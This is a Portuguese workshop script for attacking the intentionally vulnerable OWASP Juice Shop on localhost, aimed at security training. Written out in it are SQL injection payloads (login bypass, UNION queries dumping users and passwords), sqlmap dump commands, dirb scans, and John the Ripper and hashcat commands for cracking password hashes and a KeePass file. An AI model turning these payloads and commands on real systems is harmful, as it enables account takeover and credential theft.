
# Roteiro Juice-Shop Infoeste 2026

## Introdução

https://www.hackingisnotacrime.org

## 1° Iniciar Juice-Shop

O OWASP Juice Shop é uma aplicação web de código aberto propositalmente vulnerável, desenvolvida para treinar e testar habilidades em cibersegurança e hacking ético.

__Online:__ https://juice-shop.herokuapp.com/#/ 

__Github:__ https://github.com/juice-shop/juice-shop

Executar local: 
```
sudo docker run --rm -p 3000:3000 bkimminich/juice-shop
```
- [ ] Acessar página web do juice-shop http://localhost:3000

- [ ] Criar uma conta de usuário para acessar as funcionalidades do App.


## 2° Analisar Código Client-Side via Web Browser

O recurso de inspeção de elementos no Mozilla Firefox é uma ferramenta integrada que permite ver e editar o código HTML, CSS e scripts de uma página da web em tempo real.

__Como abrir:__

__Atalho:__ Pressione F12 ou Ctrl + Shift + C (no Windows/Linux) ou Cmd + Option + C (no Mac).

__Clique direito:__ Clique com o botão direito em qualquer parte da página e selecione "Inspecionar Elemento”.

- [ ] Obtenha a senha (hash) do usuário atualmente logado diretamente de um endpoint da API REST (Dica: Firefox inspect network, parâmetros email, password).

- [ ] Forge um feedback em nome de outro usuário (Dica: código HTML da área de feedback, editar #userId)

- [ ] Procure por credenciais de uma conta de teste — ainda válida — no lado do cliente (Dica: Firefox inspect debugger, código fonte main.js, search userName, testing).

- [ ] Analisar código fonte main.js, para encontrar informações importantes (Dica: Firefox inspect debugger, search parâmetros path, score, web3, admin).

- [ ] Recupere a foto do gato de Bjoern (Dica: código HTML “src”).

https://www.urlencoder.org

## 3° OSINT - Redefinir Senhas e Visualizar Dados de Métricas do Servidor

OSINT (sigla em inglês para Open Source Intelligence, ou Inteligência de Fontes Abertas) é o processo de coleta, análise e extração de conclusões a partir de informações públicas e legalmente acessíveis. Não se trata de invadir sistemas ou quebrar senhas, mas sim de juntar pontas soltas que qualquer pessoa, empresa ou governo deixou disponíveis na internet ou em registros abertos. 

https://osintframework.com

__Principais Fontes de Dados:__

__Internet aberta:__ Sites de notícias, blogs, fóruns e artigos.

__Redes sociais:__ Perfis públicos, fotos, vídeos, marcações e comentários.

__Dados governamentais e públicos:__ Registros de empresas, diários oficiais, processos judiciais e dados de órgãos públicos.

__Fontes técnicas e digitais:__ Endereços de IP, registros de domínio, metadados de arquivos e bancos de dados de senhas vazadas.

__Dark Web:__ Fóruns ou páginas indexadas em redes específicas (quando investigado de forma restrita e legal).

- [ ] Redefinir senhas de usuários emma, john utilizando técnicas de OSINT (Dica: photo-wall, exiftool, google-maps).

- [ ] Descobrir senhas de usuários amy, MC SafeSearch utilizando técnicas de OSINT (Dica: hints do Score-Board).

- [ ] Redefinir senha do usuário bjoern@owasp.org, utilizando técnicas de OSINT (Dica: redes sociais).

https://x.com/bkimminich/status/1594985736650035202

- [ ] Encontre métricas expostas que forneçam dados coletadas por um sistema de monitoramento popular (Dica: link no Score-Board).


## 4° OSINT - Descobrir Senha em Arquivo de log Vazado na Internet

- [ ] Verificar desenvolvedores do Juice-Shop via github (Dica: sherlock).

https://github.com/juice-shop/juice-shop

- [ ] Acesse o site https://stackoverflow.com, e obtenha o arquivo de log disponível via link pastebin no fórum e procure por “password” no arquivo de log.

- [ ] Decodifique a senha descoberta via https://www.urldecoder.org


## 5° Brute Force de Diretórios Web

Um ataque de força bruta de diretórios (ou enumeração de diretórios) é uma técnica de reconhecimento em segurança da informação utilizada para descobrir pastas, arquivos e endpoints ocultos em um servidor web. O processo consiste no envio em massa de requisições HTTP combinando a URL alvo com uma lista de termos predefinidos (chamada de wordlist). Se o servidor retornar um código que indique a existência do recurso (como 200 OK ou 403 Forbidden), a ferramenta mapeia esse caminho como existente.

- [ ] Acessar documentos confidenciais via ataque de força bruta de diretórios (Dica: Dirb scan).
```
dirb http://localhost:3000 -z 30 -o dir-juice.txt
```
- [ ] Faça download dos arquivos (Dica utilize a técnica Poison Null Byte %2500).

https://wiki.zacheller.dev/web-app-pentest/upload-download/error-only-.md-and-.pdf-files-are-allowed


## 6° Brute Force de Login 

Um ataque de força bruta no login é um método em que softwares automatizados testam milhares de combinações de nomes de usuário e senhas em alta velocidade até acertarem a credencial correta para invadir uma conta.

- [ ] Faça login com as credenciais de usuário do administrador sem alterá-las previamente ou aplicar SQL Injection (Dica: brute force, ZAP Attack Fuzz).

- [ ] Faça download de uma wordlist específica com senhas de credenciais padrão (Dica: Password Defaults Credentials).

https://github.com/danielmiessler/SecLists 

- [ ] Acesse a área de administrador descoberta na inspeção de código main.js.


## 7° Broken Access Control

A exploração de falhas no controle de acesso é uma habilidade fundamental dos atacantes. Ferramentas de SAST e DAST (Burp Suite, Zed Attack Proxy) conseguem detectar a ausência de controle de acesso, mas não conseguem verificar se ele é funcional quando está presente. O controle de acesso pode ser detectado por meios manuais ou, possivelmente, por meio de automação para identificar a ausência de controles em determinados frameworks.

Falhas de controle de acesso são comuns devido à ausência de detecção automatizada e à falta de testes funcionais eficazes por parte dos desenvolvedores de aplicações. A detecção de problemas de controle de acesso geralmente não se presta a testes automatizados, sejam estáticos ou dinâmicos. Testes manuais são a melhor maneira de detectar controles de acesso ausentes ou ineficazes, incluindo questões relacionadas a métodos HTTP (GET vs. PUT, POST etc.), controladores, referências diretas a objetos, entre outros.

O impacto técnico consiste em invasores agindo como usuários ou administradores, ou usuários utilizando funções privilegiadas, ou ainda criando, acessando, atualizando ou excluindo quaisquer registros. O impacto para o negócio depende das necessidades de proteção da aplicação e dos dados.

- [ ] Postar um Feedback  0 estrelas (Dica: ZAP Open/Resend, método POST editar campo JSON).

- [ ] Ver o carrinho de compra de outro usuário (Dica: ZAP Open/Resend, método GET alterar id de usuário na requisição).

- [ ] Forge um uma review em nome de outro usuário (Dica: ZAP Open/Resend, método PUT editar campo JSON).

- [ ] Adicione um produto no carrinho de outro usuário (Dica: ZAP Open/Resend, método POST editar JSON, duplicar a propriedade "BasketId": "x").

- [ ] Adicione um novo usuário com permissões de administrador (Dica: ZAP Open/Resend, método POST editar JSON).


## 8° Injection

Praticamente qualquer fonte de dados pode ser um vetor de injeção: variáveis ​​de ambiente, parâmetros, serviços web externos e internos, e todos os tipos de usuários. Falhas de injeção ocorrem quando um atacante consegue enviar dados maliciosos a um interpretador.

Falhas de injeção são muito comuns, especialmente em código legado. Vulnerabilidades de injeção são frequentemente encontradas em consultas SQL, LDAP, XPath ou NoSQL, comandos do sistema operacional, analisadores XML, cabeçalhos SMTP, linguagens de expressão e consultas ORM. Falhas de injeção são fáceis de detectar ao examinar o código. Ferramentas de varredura (*scanners* e *fuzzers*) podem ajudar invasores a encontrar falhas de injeção.

A injeção pode resultar em perda ou corrupção de dados, divulgação a partes não autorizadas, perda de rastreabilidade ou negação de acesso. A injeção pode, por vezes, levar à tomada de controle total do host. O impacto para o negócio depende das necessidades da aplicação e dos dados.

- [ ] Faça login de usuários via injeção SQL.

            E-mail: ' OR 1=1 --
            E-mail = user@dom.net' --
            Senha: qualquer

- [ ] Obtenha o Schema do banco de dados SQL (Dica: sqlmap, método Union).
```
sqlmap -u "http://localhost:3000/rest/products/search?q=q" --dbms=sqlite --level=3 --risk=3 --technique=U --threads=4 --schema --no-cast --ignore-code=500
```
```
sqlmap -u "http://localhost:3000/rest/products/search?q=q" --dbms=sqlite -D SQLite_masterdb -T Users -C email,password,role --dump --threads=4 --no-cast --ignore-code=500
```
Payloads Schema Database baseados em operador SQL Union.

Usa o operador UNION do SQL para juntar o resultado da busca original do site com os dados obtidos pelo invasor.

- [ ] Utilize o ZAP (Open/Resend) no campo de pesquisa de produtos do juice-shop.
```
orange')) UNION SELECT * FROM sql --
```
Consulte https://www.sqlite.org/faq.html no item "(7) How do I list all tables/indices contained in an SQLite database" (Como listo todas as tabelas/índices contidos em um banco de dados SQLite), que o esquema é armazenado em uma tabela do sistema chamada (sqlite_master).
```
orange')) UNION SELECT * FROM sqlite_master --
```
```
orange')) UNION SELECT 1 FROM sqlite_master --
```
```
orange')) UNION SELECT 1,2 FROM sqlite_master --
``` 
Repetir até receber uma resposta JSON de sucesso.
``` 
orange')) UNION SELECT 1,2,3,4,5,6,7,8,9 FROM sqlite_master --
```
O último passo é substituir o primeiro valor "1" pelo nome correto da coluna "sql".
``` 
orange')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master –
```
Procure no código JSON por CREATE TABLE Users.

Acrescente os campos importantes para extração dos dados e complete com os números da colunas.
```
orange')) UNION SELECT id,username,email,password,role,6,7,8,9 FROM users --
```

## 9° Brute Force de Hash

Um ataque de força bruta de hash é um método usado para descobrir a senha original por trás de um código criptografado (o hash) testando milhões de combinações possíveis de palavras e caracteres por segundo.

- [ ] Realize um brute force no hash de senha do usuário jim (Dica, John The Ripper, Wordlist Rockyou).
```
hashid -m jim-hash.txt
```
```
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```
```
john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 jim-hash.txt --fork=2
```

## 10° XSS Cross Site Script

Existem três formas de XSS, geralmente direcionadas aos navegadores dos usuários:

__XSS Refletido:__ O aplicativo ou API inclui entradas de usuário não validadas e não tratadas como parte da saída HTML. Um ataque bem-sucedido pode permitir que o invasor execute HTML e JavaScript arbitrários no navegador da vítima. Normalmente, o usuário precisará interagir com algum link malicioso que aponte para uma página controlada pelo invasor, como sites maliciosos de distribuição de dados, anúncios ou similares.

__XSS Armazenado:__ O aplicativo ou API armazena entradas de usuário não tratadas que são visualizadas posteriormente por outro usuário ou administrador. O XSS armazenado é frequentemente considerado um risco alto ou crítico.

__XSS DOM:__ Frameworks JavaScript, aplicativos de página única e APIs que incluem dinamicamente dados controláveis ​​pelo invasor em uma página são vulneráveis ​​ao XSS DOM. Idealmente, o aplicativo não enviaria dados controláveis ​​pelo invasor para APIs JavaScript inseguras.
Os ataques XSS típicos incluem roubo de sessão, apropriação de conta, evasão de MFA, substituição ou desfiguração de nós DOM (como painéis de login de trojans), ataques contra o navegador do usuário, como downloads de software malicioso, registro de teclas (keylogging) e outros ataques do lado do cliente.

- [ ] Use o payload no desafio de DOM XSS (Dica: Score Board XSS).
            
https://community.owasp.org/Types_of_Cross-Site_Scripting


Ferramentas automatizadas podem detectar e explorar todas as três formas de XSS, e existem frameworks de exploração disponíveis gratuitamente. O BeEF (Browser Exploitation Framework) é a principal ferramenta focada no teste de vulnerabilidades em navegadores web através de vetores de XSS (Cross-Site Scripting). O impacto do XSS é moderado para XSS refletido e XSS DOM, e grave para XSS armazenado, com execução remota de código no navegador da vítima, como roubo de credenciais, sessões ou distribuição de malware para a vítima.

## 11° JWT Json Web Token

O Json Web Token é um padrão da Internet para a criação de dados com assinatura opcional e/ou criptografia cujo payload contém o JSON que afirma algum número de declarações. Os tokens são assinados usando um segredo privado ou uma chave pública/privada.

Por exemplo, um servidor pode gerar um token com a declaração "logado como nome-usuário" e fornecê-lo a um cliente. O cliente pode então usar esse token para provar que está logado como nome-usuário.

Os tokens podem ser assinados pela chave privada de uma parte (geralmente do servidor), para que a parte possa posteriormente verificar se o token é legítimo. Se a outra parte, por alguns meios adequados e confiáveis, estiver na posse da chave pública correspondente, ela também poderá verificar a legitimidade do token.

Os tokens foram projetados para serem compactos, seguros para URL e utilizáveis, especialmente em um contexto de login único (SSO) no navegador da web. As declarações Json Web Token geralmente podem ser usadas para transmitir a identidade de usuários autenticados entre um provedor de identidade e um provedor de serviços ou qualquer outro tipo de declaração, conforme exigido pelos processos de negócios.

Crie um Json Web Token essencialmente sem assinatura que se faça passar pelo usuário (inexistente) jwtn3d@juice-sh.op.

- [ ] Primeiro você deve começar obtendo um Json Web Token válido de um usuário logado no cabeçalho de autorização da solicitação do aplicativo. (Dica: ZAP Open/Resend, /rest/user/whoami)

- [ ] Os sites indicados logo abaixo oferecem um depurador online muito conveniente para Json Web Token que pode ser inestimável para este desafio.

 https://tribestream.io/tools/jwt/

https://www.jwt.io/

- [ ] Tente convencer o Juice-Shop a fornecer um token válido com o payload necessário, desativando completamente a criptografia. 

## 12° Quebrar Senha do Arquivo de Gerenciador do Suporte

- [ ] Inspecionar o código main.js para procurar linhas relativas com e-mail de suporte, analisar parâmetros de requisitos de senha (Dica: search, support@).

- [ ] Criar uma wordlist personalizada via Crunch.
```
crunch 12 12 -t Support%%%%^ -o custom-wordlist.txt
```
- [ ] Decifrar senha do arquivo do gerenciador de senhas via John The Ripper.
```
keepass2john file.kdbx > hash-keepass-file.txt
```
```
john –wordlist=custom-wordlist.txt hash-keepass-file.txt
```
- [ ] Instalar o KeePassXC no Kali Linux keepassxc.org.
```
sudo apt install keepassxc-full -y
```
- [ ] Acessar o arquivo de senhas do suporte via aplicativo KeepassXC.

- [ ] Exemplo de Modo Força Bruta via Hash Cat (Somente para máquinas potentes).

$ hashcat -a 3 -m 13400 hash-keepass-file.txt ?u?l?l?l?l?l?l?d?d?d?d?s


## 13° Reportar Problemas de Segurança Encontrados

https://securitytxt.org

Quando riscos de segurança em serviços web são descobertos por pesquisadores de segurança independentes que compreendem a gravidade do risco, eles geralmente não dispõem dos canais necessários para divulgá-los adequadamente. Como resultado, problemas de segurança podem não ser reportados. O security.txt define um padrão para ajudar as organizações a definir o processo para que pesquisadores de segurança divulguem vulnerabilidades de segurança.

- [ ] Comporte-se como qualquer "white-hat" deveria antes de entrar em ação.

__Labs:__

https://tryhackme.com/room/owaspjuiceshop

https://portswigger.net/web-security

https://pentest-ground.com
